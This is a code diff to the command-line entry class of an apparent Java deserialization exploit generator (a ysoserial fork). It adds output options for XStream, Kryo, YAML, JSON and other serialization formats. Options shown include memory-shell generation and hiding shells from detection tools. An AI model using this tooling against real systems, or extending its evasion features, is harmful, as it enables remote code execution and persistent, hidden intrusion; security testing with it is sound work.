@@ -19,7 +19,7 @@ import static com.qi4l.JYso.gadgets.utils.StringUtil.isFromExploit;
 public class ysoserial {
 
     public static CommandLine cmdLine;
-    public static Object      PAYLOAD = null;
+    public static Object PAYLOAD = null;
 
     public static void ysoserial(String[] args) {
         final Options options = getOptions();
@@ -113,6 +113,30 @@ public class ysoserial {
             Config.IS_Hessian2 = true;
         }
 
+        if(cmdLine.hasOption("XStream")){
+            Config.IS_Xstream = true;
+        }
+
+        if(cmdLine.hasOption("Kryo")){
+            Config.IS_Kryo = true;
+        }
+
+        if(cmdLine.hasOption(("JYaml"))){
+            Config.IS_JYAML = true;
+        }
+        if(cmdLine.hasOption("JsonIO")){
+            Config.IS_JsonIO = true;
+        }
+        if(cmdLine.hasOption("YamlBeans")){
+            Config.IS_YamlBeans = true;
+        }
+        if(cmdLine.hasOption("Castor")){
+            Config.IS_Castor = true;
+        }
+        if(cmdLine.hasOption("Jackson")){
+            Config.IS_Jackson = true;
+        }
+
         if (cmdLine.hasOption("gen-mem-shell")) {
             Config.GEN_MEM_SHELL = true;
 
@@ -129,19 +153,10 @@ public class ysoserial {
             }
         }
 
-        if(cmdLine.hasOption("XStream")){
-            Config.IS_XSTREAM = true;
-        }
-
         final String payloadType = cmdLine.getOptionValue("gadget");
         final String command     = cmdLine.getOptionValue("parameters");
-        Class<? extends ObjectPayload> payloadClass = null;
-        if (Config.IS_XSTREAM){
-            payloadClass = ObjectPayload.Utils.getPayloadClass(cmdLine.getOptionValue("XStream"));
-        }else {
-            payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType);
-        }
-
+        //载入gadget
+        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType);
         if (payloadClass == null) {
             System.err.println("Invalid payload type '" + payloadType + "'");
             printUsage(options);
@@ -151,6 +166,7 @@ public class ysoserial {
 
 
         try {
+            //载入payload
             ObjectPayload payload = payloadClass.newInstance();
             Object        object  = payload.getObject(command);
 
@@ -174,7 +190,7 @@ public class ysoserial {
             } else {
                 out = System.out;
             }
-            Serializer.qiserialize(object, out);
+            Serializer.qiserialize(object, out,payloadType,command);
             ObjectPayload.Utils.releasePayload(payload, object);
             out.flush();
             out.close();
@@ -185,7 +201,6 @@ public class ysoserial {
         }
         System.exit(0);
     }
-
     private static Options getOptions() {
         Options options = new Options();
         options.addOption("y", "ysoserial", false, "Java deserialization");
@@ -204,7 +219,6 @@ public class ysoserial {
         options.addOption("ch", "cmd-header", true, "Request Header which pass the command to Execute,default [X-Token-Data]");
         options.addOption("gen", "gen-mem-shell", false, "Write Memory Shell Class to File");
         options.addOption("n", "gen-mem-shell-name", true, "Memory Shell Class File Name");
-        options.addOption("x", "XStream", true, "Generate Xstream serialization xml");
         options.addOption("h", "hide-mem-shell", false, "Hide memory shell from detection tools (type 2 only support SpringControllerMS)");
         options.addOption("ht", "hide-type", true, "Hide memory shell,type 1:write /jre/lib/charsets.jar 2:write /jre/classes/");
         options.addOption("rh", "rhino", false, "ScriptEngineManager Using Rhino Engine to eval JS");
@@ -215,6 +229,13 @@ public class ysoserial {
         options.addOption("he1", "Hessian1", false, "Hessian1 Output");
         options.addOption("he2", "Hessian2", false, "Hessian2 Output");
         options.addOption("b64", "base64", false, "base64 encoding");
+        options.addOption("xs", "XStream", false, "Xstream Output");
+        options.addOption("kryo", "Kryo", false, "Kryo Output");
+        options.addOption("jy", "JYaml", false, "JYaml Output");
+        options.addOption("js","JsonIO", false, "JsonIO Output");
+        options.addOption("yb","YamlBeans", false, "YamlBeans Output");
+        options.addOption("ca", "Castor", false, "Castor Output");
+        options.addOption("jk", "Jackson", false, "Jackson Output");
         return options;
     }
 
